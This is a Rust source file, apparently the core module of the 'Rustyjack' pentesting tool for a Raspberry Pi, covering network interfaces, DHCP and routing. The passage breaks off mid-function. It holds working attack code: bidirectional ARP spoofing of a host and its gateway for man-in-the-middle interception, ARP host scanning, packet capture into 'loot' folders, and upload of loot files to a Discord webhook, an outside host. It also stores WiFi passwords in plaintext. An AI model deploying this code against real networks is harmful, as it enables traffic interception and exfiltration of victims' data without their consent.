//! # Rustyjack Core System Module
//!
//! This module provides core system functionality for network operations, WiFi management,
//! and system integration.
//!
//! ## Security Notes
//!
//! ### WiFi Password Storage
//! **IMPORTANT**: WiFi passwords are currently stored as **PLAINTEXT** in JSON profile files
//! located at `<root>/wifi/profiles/*.json`. This is intentional for this pentesting tool
//! but presents a security risk. Ensure proper file permissions are set:
//!
//! ```bash
//! chmod 600 <root>/wifi/profiles/*.json
//! chmod 700 <root>/wifi/profiles/
//! ```
//!
//! The tool is designed to run as root on a Raspberry Pi Zero W 2 and assumes physical
//! security of the device. For production use, consider implementing:
//! - Encrypted password storage using `keyring` or `secret-service`
//! - Hardware-backed encryption via TPM
//! - Kernel keyring integration
//!
//! ### Permission Requirements
//! All network operations require root privileges (UID 0). Operations will fail with
//! explicit error messages if not run as root.

pub mod dns;
pub mod interface_selection;
pub mod isolation;
pub mod isolation_guard;
pub mod isolation_policy;
pub mod loot_session;
pub mod ops;
pub mod preference;
pub mod routing;
pub mod setup;

pub use dns::DnsManager;
pub use interface_selection::{InterfaceSelectionOutcome, SelectionDhcpInfo};
pub use isolation::{clear_hotspot_exception, set_hotspot_exception, IsolationEngine};
pub use isolation_guard::IsolationPolicyGuard;
pub use isolation_policy::{IsolationMode, IsolationPolicy, IsolationPolicyManager};
pub use loot_session::LootSession;
pub use ops::{
    DhcpLease as OpsDhcpLease, ErrorEntry, InterfaceSummary, IsolationOutcome, NetOps, RealNetOps,
    RouteEntry, RouteOutcome,
};
pub use preference::PreferenceManager;
pub use routing::RouteManager;

use std::{
    collections::HashMap,
    env,
    ffi::CString,
    fs,
    io::{self, Write},
    mem,
    net::{IpAddr, Ipv4Addr, ToSocketAddrs},
    os::unix::io::RawFd,
    path::{Path, PathBuf},
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex, OnceLock,
    },
    time::{Duration, Instant, SystemTime, UNIX_EPOCH},
};

#[cfg(unix)]
use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};

use anyhow::{anyhow, bail, Context, Result};
use chrono::Local;
use ipnet::Ipv4Net;
use reqwest::blocking::{multipart, Client};
use rustyjack_netlink::{
    ArpSpoofConfig, ArpSpoofer, DhcpTransport, DnsConfig, DnsRule, DnsServer, IptablesManager,
};
use rustyjack_wireless::status_hotspot;
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};
use tracing::{debug, info, warn};
use zeroize::Zeroize;

use rustyjack_netlink::wireless::{InterfaceMode, WirelessManager};
use rustyjack_netlink::{StationBackendKind, StationConfig, StationManager};

use crate::cancel::{cancel_sleep, check_cancel, CancelFlag};
use crate::netlink_helpers::{
    netlink_add_default_route, netlink_bridge_add_interface, netlink_bridge_create,
    netlink_bridge_delete, netlink_delete_default_route, netlink_get_interface_index,
    netlink_get_ipv4_addresses, netlink_list_interfaces, netlink_list_routes,
    netlink_set_interface_down, netlink_set_interface_up, process_kill_pattern, process_running,
    rfkill_find_index, rfkill_unblock,
};

const FALLBACK_DNS: [Ipv4Addr; 2] = [Ipv4Addr::new(1, 1, 1, 1), Ipv4Addr::new(9, 9, 9, 9)];
const ETH_METRIC: u32 = 100;
const WLAN_METRIC: u32 = 200;

#[derive(Debug, Clone)]
pub struct LeaseRecord {
    pub address: Ipv4Addr,
    pub prefix_len: u8,
    pub gateway: Option<Ipv4Addr>,
    pub dns_servers: Vec<Ipv4Addr>,
    pub acquired_at: SystemTime,
}

#[derive(Debug, Clone)]
pub struct DhcpOutcome {
    pub success: bool,
    pub transport: Option<String>,
    pub error: Option<String>,
    pub address: Option<Ipv4Addr>,
    pub gateway: Option<Ipv4Addr>,
    pub recorded_at: SystemTime,
}

#[derive(Debug)]
pub enum DhcpAttemptResult {
    Lease(OpsDhcpLease),
    Busy,
    Failed(String),
}

static LEASE_CACHE: OnceLock<Mutex<HashMap<String, LeaseRecord>>> = OnceLock::new();
static DHCP_OUTCOME_CACHE: OnceLock<Mutex<HashMap<String, DhcpOutcome>>> = OnceLock::new();
static INTERFACE_LOCKS: OnceLock<Mutex<HashMap<String, &'static Mutex<()>>>> = OnceLock::new();
static UPLINK_LOCK: OnceLock<Mutex<()>> = OnceLock::new();
static ACTIVE_UPLINK: OnceLock<Mutex<Option<String>>> = OnceLock::new();

fn interface_lock(interface: &str) -> &'static Mutex<()> {
    let locks = INTERFACE_LOCKS.get_or_init(|| Mutex::new(HashMap::new()));
    let mut guard = locks
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    if let Some(lock) = guard.get(interface) {
        return *lock;
    }
    let lock = Box::leak(Box::new(Mutex::new(())));
    guard.insert(interface.to_string(), lock);
    lock
}

fn lock_interface(interface: &str) -> std::sync::MutexGuard<'static, ()> {
    interface_lock(interface)
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn try_lock_interface(interface: &str) -> Option<std::sync::MutexGuard<'static, ()>> {
    interface_lock(interface).try_lock().ok()
}

fn lock_uplink() -> std::sync::MutexGuard<'static, ()> {
    let lock = UPLINK_LOCK.get_or_init(|| Mutex::new(()));
    lock.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn record_lease(interface: &str, lease: &OpsDhcpLease) {
    let cache = LEASE_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    let mut guard = cache
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    guard.insert(
        interface.to_string(),
        LeaseRecord {
            address: lease.ip,
            prefix_len: lease.prefix_len,
            gateway: lease.gateway,
            dns_servers: lease.dns_servers.clone(),
            acquired_at: SystemTime::now(),
        },
    );
}

fn record_dhcp_outcome(
    interface: &str,
    success: bool,
    transport: Option<String>,
    lease: Option<&OpsDhcpLease>,
    error: Option<String>,
) {
    let cache = DHCP_OUTCOME_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    let mut guard = cache
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    let (address, gateway) = lease
        .map(|lease| (Some(lease.ip), lease.gateway))
        .unwrap_or((None, None));
    guard.insert(
        interface.to_string(),
        DhcpOutcome {
            success,
            transport,
            error,
            address,
            gateway,
            recorded_at: SystemTime::now(),
        },
    );
}

pub fn lease_record(interface: &str) -> Option<LeaseRecord> {
    let cache = LEASE_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    let guard = cache
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    guard.get(interface).cloned()
}

pub fn clear_lease_record(interface: &str) {
    let cache = LEASE_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    let mut guard = cache
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    guard.remove(interface);
}

pub fn cached_gateway(interface: &str) -> Option<Ipv4Addr> {
    lease_record(interface).and_then(|lease| lease.gateway)
}

pub fn cached_dns(interface: &str) -> Vec<Ipv4Addr> {
    lease_record(interface)
        .map(|lease| lease.dns_servers)
        .unwrap_or_default()
}

pub fn last_dhcp_outcome(interface: &str) -> Option<DhcpOutcome> {
    let cache = DHCP_OUTCOME_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    let guard = cache
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    guard.get(interface).cloned()
}

fn set_active_uplink(interface: Option<String>) {
    let lock = ACTIVE_UPLINK.get_or_init(|| Mutex::new(None));
    let mut guard = lock.lock().unwrap_or_else(|poisoned| poisoned.into_inner());
    *guard = interface;
}

pub fn active_uplink() -> Option<String> {
    let lock = ACTIVE_UPLINK.get_or_init(|| Mutex::new(None));
    let guard = lock.lock().unwrap_or_else(|poisoned| poisoned.into_inner());
    guard.clone()
}

fn fallback_dns() -> Vec<Ipv4Addr> {
    FALLBACK_DNS.to_vec()
}

#[derive(Debug, Clone, Serialize)]
pub struct InterfaceInfo {
    pub name: String,
    pub address: Ipv4Addr,
    pub prefix: u8,
}

impl InterfaceInfo {
    pub fn network_cidr(&self) -> String {
        let prefix = self.prefix.min(32);
        let mask = if prefix == 0 {
            0
        } else {
            let shift = 32 - prefix as u32;
            u32::MAX.checked_shl(shift).unwrap_or(0)
        };
        let addr = u32::from(self.address);
        let network = addr & mask;
        format!("{}/{}", Ipv4Addr::from(network), prefix)
    }
}

#[derive(Debug, Clone)]
pub struct HostInfo {
    pub ip: Ipv4Addr,
}

#[derive(Debug, Clone, Serialize)]
pub struct InterfaceStats {
    pub rx_bytes: u64,
    pub tx_bytes: u64,
    pub oper_state: String,
}

#[derive(Default)]
pub struct WifiLinkInfo {
    pub connected: bool,
    pub ssid: Option<String>,
    pub signal_dbm: Option<i32>,
    pub tx_bitrate: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct WifiNetwork {
    pub ssid: Option<String>,
    pub bssid: Option<String>,
    pub quality: Option<String>,
    pub signal_dbm: Option<i32>,
    pub channel: Option<u8>,
    pub encrypted: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiProfile {
    pub ssid: String,
    #[serde(default)]
    pub password: Option<String>,
    #[serde(default = "default_wifi_interface")]
    pub interface: String,
    #[serde(default)]
    pub priority: i32,
    #[serde(default = "default_true")]
    pub auto_connect: bool,
    #[serde(default)]
    pub created: Option<String>,
    #[serde(default)]
    pub last_used: Option<String>,
    #[serde(default)]
    pub notes: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct WifiProfileRecord {
    pub ssid: String,
    pub interface: String,
    pub priority: i32,
    pub auto_connect: bool,
    pub filename: String,
    pub last_used: Option<String>,
    pub created: Option<String>,
}

#[derive(Debug, Clone)]
pub struct StoredWifiProfile {
    pub profile: WifiProfile,
    pub path: PathBuf,
}

fn default_wifi_interface() -> String {
    "auto".to_string()
}

fn default_true() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DefaultRouteInfo {
    pub interface: Option<String>,
    pub gateway: Option<Ipv4Addr>,
    pub metric: Option<u32>,
}

pub enum KillResult {
    Terminated,
    NotFound,
}

pub fn resolve_root(input: Option<PathBuf>) -> Result<PathBuf> {
    if let Some(path) = input {
        return Ok(path);
    }

    if let Ok(env_path) = env::var("RUSTYJACK_ROOT") {
        return Ok(PathBuf::from(env_path));
    }

    let default = PathBuf::from("/var/lib/rustyjack");
    if default.exists() {
        return Ok(default);
    }

    let legacy = PathBuf::from("/root/Rustyjack");
    if legacy.exists() {
        return Ok(legacy);
    }

    env::current_dir().context("determining current directory")
}

pub fn detect_interface(override_name: Option<String>) -> Result<InterfaceInfo> {
    let name = match override_name {
        Some(name) => name,
        None => discover_default_interface().context("could not detect a default interface")?,
    };

    info!(target: "net", iface = %name, "interface_detect_start");
    let addrs = netlink_get_ipv4_addresses(&name)
        .with_context(|| format!("collecting IPv4 data for {name}"))?;
    let mut ipv4_list = Vec::new();
    for addr in &addrs {
        if let std::net::IpAddr::V4(v4) = addr.address {
            ipv4_list.push(format!("{}/{}", v4, addr.prefix_len));
        }
    }
    if ipv4_list.is_empty() {
        warn!(target: "net", iface = %name, "interface_ipv4_missing");
    } else {
        info!(
            target: "net",
            iface = %name,
            ipv4 = %ipv4_list.join(", "),
            "interface_ipv4_addresses"
        );
    }
    let (addr, prefix) = addrs
        .into_iter()
        .find_map(|addr| match addr.address {
            std::net::IpAddr::V4(v4) => Some((v4, addr.prefix_len)),
            _ => None,
        })
        .ok_or_else(|| anyhow!("no IPv4 address found for {name}"))?;

    Ok(InterfaceInfo {
        name,
        address: addr,
        prefix,
    })
}

/// Detect an Ethernet interface (eth*/en*) and fail if none are present.
pub fn detect_ethernet_interface(override_name: Option<String>) -> Result<InterfaceInfo> {
    let summaries = list_interface_summaries().context("listing interfaces")?;
    info!(
        target: "net",
        override_name = ?override_name,
        "ethernet_detect_start"
    );
    for summary in &summaries {
        debug!(
            target: "net",
            iface = %summary.name,
            kind = %summary.kind,
            state = %summary.oper_state,
            ip = ?summary.ip,
            "interface_summary"
        );
    }

    // Helper to validate a wired, Ethernet-style name
    let is_eth = |s: &InterfaceSummary| {
        s.kind == "wired" && (s.name.starts_with("eth") || s.name.starts_with("en"))
    };
    let select = |summary: &InterfaceSummary, reason: &str| -> Result<InterfaceInfo> {
        info!(
            target: "net",
            iface = %summary.name,
            reason = %reason,
            "ethernet_selected"
        );
        detect_interface(Some(summary.name.clone()))
    };

    if let Some(name) = override_name {
        let summary = summaries
            .iter()
            .find(|s| s.name == name)
            .ok_or_else(|| anyhow!("interface {} not found", name))?;

        if !is_eth(summary) {
            bail!(
                "interface {} is not an Ethernet port (expected eth*/en*)",
                name
            );
        }

        return select(summary, "override");
    }

    // Prefer: up + has IP -> has IP -> up -> any eth*/en*
    if let Some(summary) = summaries
        .iter()
        .find(|s| is_eth(s) && s.oper_state == "up" && s.ip.is_some())
    {
        return select(summary, "up+ip");
    }
    if let Some(summary) = summaries.iter().find(|s| is_eth(s) && s.ip.is_some()) {
        return select(summary, "ip");
    }
    if let Some(summary) = summaries.iter().find(|s| is_eth(s) && s.oper_state == "up") {
        return select(summary, "up");
    }
    if let Some(summary) = summaries.iter().find(|s| is_eth(s)) {
        return select(summary, "fallback");
    }

    bail!("No Ethernet interfaces detected (need eth*/en*)");
}

pub fn discover_default_interface() -> Result<String> {
    if let Ok(Some(route)) = read_default_route() {
        if let Some(name) = route.interface {
            info!(
                target: "net",
                iface = %name,
                gateway = ?route.gateway,
                metric = ?route.metric,
                "default_route_interface"
            );
            return Ok(name);
        }
        warn!(target: "net", "default_route_missing_interface");
    }

    let entries = fs::read_dir("/sys/class/net").context("listing network interfaces")?;
    for entry in entries {
        let entry = entry?;
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if name != "lo" {
            info!(target: "net", iface = %name, "default_interface_fallback");
            return Ok(name.into());
        }
    }

    Err(anyhow!("no usable network interface found"))
}

pub fn build_scan_loot_path(root: &Path, label: &str) -> Result<PathBuf> {
    let safe_label = sanitize_label(label);
    let timestamp = Local::now().format("%Y-%m-%d_%H-%M-%S");
    let relative = format!("loot/Scan/{}_{}.txt", safe_label, timestamp);
    Ok(root.join(relative))
}

pub fn read_discord_webhook(root: &Path) -> Result<Option<String>> {
    let path = root.join("discord_webhook.txt");
    if !path.exists() {
        return Ok(None);
    }
    let value = fs::read_to_string(path).context("reading discord_webhook.txt")?;
    let value = value.trim();
    if value.starts_with("https://discord.com/api/webhooks/") && !value.is_empty() {
        Ok(Some(value.to_string()))
    } else {
        Ok(None)
    }
}

pub fn send_scan_to_discord(
    root: &Path,
    label: &str,
    loot_path: &Path,
    target: &str,
    interface: &str,
) -> Result<bool> {
    let metadata = fs::metadata(loot_path)
        .with_context(|| format!("cannot read loot metadata at {}", loot_path.display()))?;
    if metadata.len() == 0 {
        debug!("Loot file is empty, skipping Discord notification");
        return Ok(false);
    }

    let filename = loot_path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("scan.txt");
    let description = format!(
        "**Target Network:** `{}`\n**Interface:** `{}`\n**Timestamp:** {}",
        target,
        interface,
        Local::now().format("%Y-%m-%d %H:%M:%S")
    );
    let embed = json!({
        "title": format!("Scan Complete: {label}"),
        "description": description,
        "color": 0x00ff00,
        "fields": [{
            "name": "Scan Results",
            "value": format!(
                "**File:** `{}`\n**Size:** {} bytes\nDownload the attached file for full details",
                filename,
                metadata.len()
            )
        }],
        "footer": {
            "text": "Rustyjack Scanner"
        },
        "timestamp": Local::now().to_rfc3339(),
    });

    send_discord_payload(root, Some(embed), Some(loot_path), None)
}

pub fn build_manual_embed(title: &str, target: Option<&str>, interface: Option<&str>) -> Value {
    let mut description = String::new();
    if let Some(target) = target {
        description.push_str(&format!("**Target:** `{}`\n", target));
    }
    if let Some(interface) = interface {
        description.push_str(&format!("**Interface:** `{}`\n", interface));
    }
    let mut embed = serde_json::Map::new();
    embed.insert("title".into(), Value::String(title.to_string()));
    if !description.is_empty() {
        embed.insert(
            "description".into(),
            Value::String(description.trim().to_string()),
        );
    }
    embed.insert("timestamp".into(), Value::String(Local::now().to_rfc3339()));
    Value::Object(embed)
}

/// Maximum response body bytes to capture for diagnostics.
const DISCORD_DIAG_MAX_BYTES: usize = 8192;
/// Default max retry attempts for Discord webhook.
const DISCORD_MAX_RETRIES: u32 = 5;
/// Default per-file cap (Discord files[n] limit).
const DISCORD_MAX_FILES_PER_MESSAGE: usize = 10;

/// Redact Discord webhook URL tokens from error messages.
fn redact_webhook_url(s: &str) -> String {
    use regex::Regex;
    // Match discord webhook URLs and redact the token portion
    let re = Regex::new(r"(https://discord\.com/api/webhooks/)\d+/[A-Za-z0-9_-]+")
        .expect("valid regex");
    re.replace_all(s, "${1}[REDACTED]").to_string()
}

/// Extract diagnostic snippet from a Discord error response (truncated, redacted).
fn discord_error_snippet(body: &str) -> String {
    let truncated = if body.len() > DISCORD_DIAG_MAX_BYTES {
        &body[..DISCORD_DIAG_MAX_BYTES]
    } else {
        body
    };
    redact_webhook_url(truncated)
}

/// Determine if an HTTP status code should NOT be retried.
fn discord_status_is_fatal(status: u16) -> bool {
    matches!(status, 400 | 401 | 403 | 404 | 413)
}

/// Parse the retry-after delay from a 429 response.
/// Checks the Retry-After header first, then falls back to retry_after in JSON body.
fn parse_retry_after(
    headers: &reqwest::header::HeaderMap,
    body: &str,
) -> Duration {
    // Try Retry-After header
    if let Some(val) = headers.get("retry-after").or_else(|| headers.get("Retry-After")) {
        if let Ok(s) = val.to_str() {
            if let Ok(secs) = s.trim().parse::<f64>() {
                let wait = (secs.ceil() as u64).max(1) + 1;
                return Duration::from_secs(wait);
            }
        }
    }
    // Fallback: parse retry_after from JSON body
    if let Ok(parsed) = serde_json::from_str::<Value>(body) {
        if let Some(ra) = parsed.get("retry_after").and_then(|v| v.as_f64()) {
            let wait = (ra.ceil() as u64).max(1) + 1;
            return Duration::from_secs(wait);
        }
    }
    Duration::from_secs(5)
}

/// Execute a single Discord webhook HTTP request with retry/backoff.
/// Handles 429 with Retry-After, fails fast on 400/401/403/404/413,
/// retries on transient 5xx with bounded attempts.
fn discord_send_with_retry(
    client: &Client,
    webhook: &str,
    build_request: impl Fn() -> Result<reqwest::blocking::RequestBuilder>,
) -> Result<bool> {
    let max_retries = DISCORD_MAX_RETRIES;

    for attempt in 1..=max_retries {
        let request = build_request()?;
        let response = match request.send() {
            Ok(r) => r,
            Err(e) => {
                warn!("Discord request failed (attempt {}/{}): {}", attempt, max_retries, redact_webhook_url(&e.to_string()));
                if attempt < max_retries {
                    std::thread::sleep(Duration::from_secs((attempt * 2).into()));
                    continue;
                }
                bail!("Discord webhook send failed after {} attempts: {}", max_retries, redact_webhook_url(&e.to_string()));
            }
        };

        let status = response.status();
        let status_code = status.as_u16();

        if status.is_success() {
            return Ok(true);
        }

        let headers = response.headers().clone();
        let body = response.text().unwrap_or_default();
        let snippet = discord_error_snippet(&body);

        // 429: Rate limited - honor Retry-After
        if status_code == 429 {
            let wait = parse_retry_after(&headers, &body);
            warn!(
                "Discord rate limited (429). Waiting {:?} before retry {}/{}.",
                wait, attempt, max_retries
            );
            std::thread::sleep(wait);
            continue;
        }

        // Fatal status codes: do not retry
        if discord_status_is_fatal(status_code) {
            bail!(
                "Discord webhook returned non-retryable HTTP {} (attempt {}/{}). Response: {}",
                status_code, attempt, max_retries, snippet
            );
        }

        // 5xx: transient server error, retry with backoff
        if status_code >= 500 {
            warn!(
                "Discord transient error ({}). Retrying in {}s (attempt {}/{}). Response: {}",
                status_code, attempt * 2, attempt, max_retries, snippet
            );
            if attempt < max_retries {
                std::thread::sleep(Duration::from_secs((attempt * 2).into()));
                continue;
            }
        }

        bail!(
            "Discord webhook returned HTTP {} after {} attempts. Response: {}",
            status_code, attempt, snippet
        );
    }

    bail!("Discord webhook failed after {} attempts", max_retries);
}

pub fn send_discord_payload(
    root: &Path,
    embed: Option<Value>,
    file: Option<&Path>,
    content: Option<&str>,
) -> Result<bool> {
    // Single file: delegate to multi-file sender
    let files: Vec<&Path> = file.into_iter().collect();
    send_discord_files(root, embed, &files, content)
}

/// Send a Discord webhook message with zero or more file attachments.
/// Files are attached as `files[0]`, `files[1]`, etc. per Discord API.
/// If the file count exceeds `DISCORD_MAX_FILES_PER_MESSAGE`, multiple
/// webhook posts are made automatically.
pub fn send_discord_files(
    root: &Path,
    embed: Option<Value>,
    files: &[&Path],
    content: Option<&str>,
) -> Result<bool> {
    let Some(webhook) = read_discord_webhook(root)? else {
        return Ok(false);
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(120))
        .build()
        .context("building HTTP client")?;

    // Build payload JSON (content + optional embeds)
    let mut payload = serde_json::Map::new();
    if let Some(text) = content {
        if !text.is_empty() {
            payload.insert("content".into(), Value::String(text.to_string()));
        }
    }
    if let Some(embed_value) = &embed {
        payload.insert("embeds".into(), json!([embed_value]));
    }
    if payload.is_empty() && files.is_empty() {
        bail!("Discord payload must include at least a message, embed, or file");
    }

    if files.is_empty() {
        // JSON-only post (no files)
        let payload_value = Value::Object(payload);
        let webhook_clone = webhook.clone();
        discord_send_with_retry(&client, &webhook, || {
            Ok(client.post(&webhook_clone).json(&payload_value))
        })?;
        return Ok(true);
    }

    // Split files into chunks of DISCORD_MAX_FILES_PER_MESSAGE
    let chunks: Vec<&[&Path]> = files.chunks(DISCORD_MAX_FILES_PER_MESSAGE).collect();
    let total_chunks = chunks.len();

    for (chunk_idx, chunk) in chunks.iter().enumerate() {
        // Only include embed/content on the first chunk
        let mut chunk_payload = if chunk_idx == 0 {
            payload.clone()
        } else {
            serde_json::Map::new()
        };

        // Add attachments metadata
        let attachments: Vec<Value> = chunk
            .iter()
            .enumerate()
            .map(|(i, path)| {
                let fname = path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("file");
                json!({ "id": i, "filename": fname })
            })
            .collect();
        chunk_payload.insert("attachments".into(), Value::Array(attachments));

        if total_chunks > 1 && chunk_idx > 0 {
            chunk_payload.insert(
                "content".into(),
                Value::String(format!(
                    "(continued, part {}/{})",
                    chunk_idx + 1,
                    total_chunks
                )),
            );
        }

        let payload_json_str = Value::Object(chunk_payload).to_string();

        // Collect file data upfront so we can rebuild the form on retry
        struct FileData {
            bytes: Vec<u8>,
            filename: String,
            idx: usize,
        }
        let mut file_data_vec = Vec::with_capacity(chunk.len());
        for (i, path) in chunk.iter().enumerate() {
            let bytes = fs::read(path)
                .with_context(|| format!("reading file for Discord upload: {}", path.display()))?;
            let filename = path
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("file")
                .to_string();
            file_data_vec.push(FileData {
                bytes,
                filename,
                idx: i,
            });
        }

        let webhook_clone = webhook.clone();
        let pjs = payload_json_str.clone();
        discord_send_with_retry(&client, &webhook, || {
            let mut form =
                multipart::Form::new().text("payload_json", pjs.clone());
            for fd in &file_data_vec {
                let part = multipart::Part::bytes(fd.bytes.clone())
                    .file_name(fd.filename.clone());
                form = form.part(format!("files[{}]", fd.idx), part);
            }
            Ok(client.post(&webhook_clone).multipart(form))
        })?;
    }

    Ok(true)
}

pub fn kill_process(name: &str) -> Result<KillResult> {
    #[cfg(target_os = "linux")]
    {
        use rustyjack_netlink::process;
        match process::pkill_exact_force(name) {
            Ok(n) if n > 0 => Ok(KillResult::Terminated),
            Ok(_) => Ok(KillResult::NotFound),
            Err(e) => bail!("Failed to kill process {}: {}", name, e),
        }
    }

    #[cfg(not(target_os = "linux"))]
    {
        bail!("process control supported on Linux only");
    }
}

pub fn kill_process_pattern(pattern: &str) -> Result<KillResult> {
    match process_kill_pattern(pattern) {
        Ok(n) if n > 0 => Ok(KillResult::Terminated),
        Ok(_) => Ok(KillResult::NotFound),
        Err(e) => bail!("Failed to kill processes matching {}: {}", pattern, e),
    }
}

pub fn process_running_exact(name: &str) -> Result<bool> {
    #[cfg(target_os = "linux")]
    {
        use rustyjack_netlink::process;
        process::ProcessManager::new()
            .exists_name(name)
            .with_context(|| format!("checking for process {name}"))
    }

    #[cfg(not(target_os = "linux"))]
    {
        bail!("process inspection supported on Linux only");
    }
}

pub fn process_running_pattern(pattern: &str) -> Result<bool> {
    process_running(pattern).with_context(|| format!("checking for pattern {pattern}"))
}

pub fn compose_status_text(mitm_running: bool, dnsspoof_running: bool) -> String {
    let mut parts = Vec::new();

    if mitm_running {
        parts.push("MITM");
    }
    if dnsspoof_running {
        parts.push("DNS");
    }

    if parts.is_empty() {
        String::new()
    } else {
        format!("({})", parts.join("+"))
    }
}

pub fn default_gateway_ip() -> Result<Ipv4Addr> {
    if let Some(route) = read_default_route()? {
        if let Some(gw) = route.gateway {
            return Ok(gw);
        }
    }
    Err(anyhow!("unable to parse default gateway"))
}

pub fn scan_local_hosts(interface: &str) -> Result<Vec<HostInfo>> {
    scan_local_hosts_cancellable(interface, None)
}

pub fn scan_local_hosts_cancellable(
    interface: &str,
    cancel: Option<&CancelFlag>,
) -> Result<Vec<HostInfo>> {
    let interface_info = detect_interface(Some(interface.to_string()))
        .context("detecting interface for ARP scan")?;
    let cidr = format!("{}/{}", interface_info.address, interface_info.prefix);
    let network: Ipv4Net = cidr
        .parse()
        .context("parsing interface CIDR for ARP scan")?;
    let rate_limit_pps = Some(50);
    let timeout = Duration::from_secs(3);

    check_cancel(cancel)?;
    let result = if let Some(flag) = cancel {
        match tokio::runtime::Handle::try_current() {
            Ok(handle) => handle.block_on(async {
                rustyjack_ethernet::discover_hosts_arp_cancellable(
                    interface,
                    network,
                    rate_limit_pps,
                    timeout,
                    flag,
                )
                .await
            }),
            Err(_) => {
                let rt = crate::runtime::shared_runtime()
                    .context("using shared tokio runtime for ARP scan")?;
                rt.block_on(async {
                    rustyjack_ethernet::discover_hosts_arp_cancellable(
                        interface,
                        network,
                        rate_limit_pps,
                        timeout,
                        flag,
                    )
                    .await
                })
            }
        }
    } else {
        match tokio::runtime::Handle::try_current() {
            Ok(handle) => handle.block_on(async {
                rustyjack_ethernet::discover_hosts_arp(interface, network, rate_limit_pps, timeout)
                    .await
            }),
            Err(_) => {
                let rt = crate::runtime::shared_runtime()
                    .context("using shared tokio runtime for ARP scan")?;
                rt.block_on(async {
                    rustyjack_ethernet::discover_hosts_arp(
                        interface,
                        network,
                        rate_limit_pps,
                        timeout,
                    )
                    .await
                })
            }
        }
    }?;

    Ok(result.hosts.into_iter().map(|ip| HostInfo { ip }).collect())
}

pub fn spawn_arpspoof_pair(interface: &str, gateway: Ipv4Addr, host: &HostInfo) -> Result<()> {
    let attacker_mac = read_interface_mac(interface)
        .and_then(|mac| parse_mac_bytes(&mac).ok())
        .ok_or_else(|| anyhow!("failed to read MAC for {}", interface))?;

    let mut to_target = ArpSpoofer::new();
    let mut to_gateway = ArpSpoofer::new();
    let interval_ms = 1000;

    to_target
        .start_continuous(ArpSpoofConfig {
            target_ip: host.ip,
            spoof_ip: gateway,
            attacker_mac,
            interface: interface.to_string(),
            interval_ms,
            restore_on_stop: true,
        })
        .with_context(|| {
            format!(
                "starting ARP spoof against host {} from gateway {}",
                host.ip, gateway
            )
        })?;

    to_gateway
        .start_continuous(ArpSpoofConfig {
            target_ip: gateway,
            spoof_ip: host.ip,
            attacker_mac,
            interface: interface.to_string(),
            interval_ms,
            restore_on_stop: true,
        })
        .with_context(|| {
            format!(
                "starting ARP spoof against gateway {} from host {}",
                gateway, host.ip
            )
        })?;

    let mut state = arp_spoof_state().lock().unwrap();
    state.push(ArpSpoofHandle {
        _interface: interface.to_string(),
        _target_ip: host.ip,
        _gateway_ip: gateway,
        spoofers: vec![to_target, to_gateway],
    });

    Ok(())
}

fn parse_mac_bytes(input: &str) -> Result<[u8; 6]> {
    let cleaned = input.trim();
    let parts: Vec<&str> = cleaned.split(':').collect();
    if parts.len() != 6 {
        bail!("invalid MAC address format: {}", input);
    }
    let mut mac = [0u8; 6];
    for (idx, part) in parts.iter().enumerate() {
        mac[idx] =
            u8::from_str_radix(part, 16).with_context(|| format!("invalid MAC octet {}", part))?;
    }
    Ok(mac)
}

pub fn build_mitm_pcap_path(root: &Path, target: Option<&str>) -> Result<PathBuf> {
    let safe = sanitize_label(target.unwrap_or("MITM"));
    let dir = root.join("loot").join("Ethernet").join(safe);
    fs::create_dir_all(&dir).context("creating Ethernet MITM loot directory")?;
    let timestamp = Local::now().format("%Y-%m-%d_%H-%M-%S");
    Ok(dir.join(format!("mitm_{timestamp}.pcap")))
}

const PCAP_MAGIC: u32 = 0xa1b2c3d4;
const PCAP_VERSION_MAJOR: u16 = 2;
const PCAP_VERSION_MINOR: u16 = 4;
const PCAP_LINKTYPE_ETHERNET: u32 = 1;
const PCAP_SNAPLEN: u32 = 262144;

struct CaptureHandle {
    stop: Arc<AtomicBool>,
    running: Arc<AtomicBool>,
    thread: std::thread::JoinHandle<()>,
}

static PCAP_CAPTURE: OnceLock<Mutex<Option<CaptureHandle>>> = OnceLock::new();

fn capture_state() -> &'static Mutex<Option<CaptureHandle>> {
    PCAP_CAPTURE.get_or_init(|| Mutex::new(None))
}

pub fn pcap_capture_running() -> bool {
    let mut state = capture_state().lock().unwrap();
    if let Some(handle) = state.as_ref() {
        if handle.thread.is_finished() {
            let handle = state.take();
            if let Some(handle) = handle {
                let _ = handle.thread.join();
            }
            return false;
        }
    }
    if let Some(handle) = state.as_ref() {
        if handle.running.load(Ordering::Relaxed) {
            return true;
        }
    }
    false
}

pub fn stop_pcap_capture() -> Result<()> {
    let handle = {
        let mut state = capture_state().lock().unwrap();
        state.take()
    };
    if let Some(handle) = handle {
        handle.stop.store(true, Ordering::SeqCst);
        let _ = handle.thread.join();
    }
    Ok(())
}

pub fn start_pcap_capture(interface: &str, path: &Path) -> Result<()> {
    let _ = stop_pcap_capture();

    let fd = open_packet_socket(interface)?;
    let file = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(path)
        .with_context(|| format!("opening pcap file {}", path.display()))?;
    let writer =
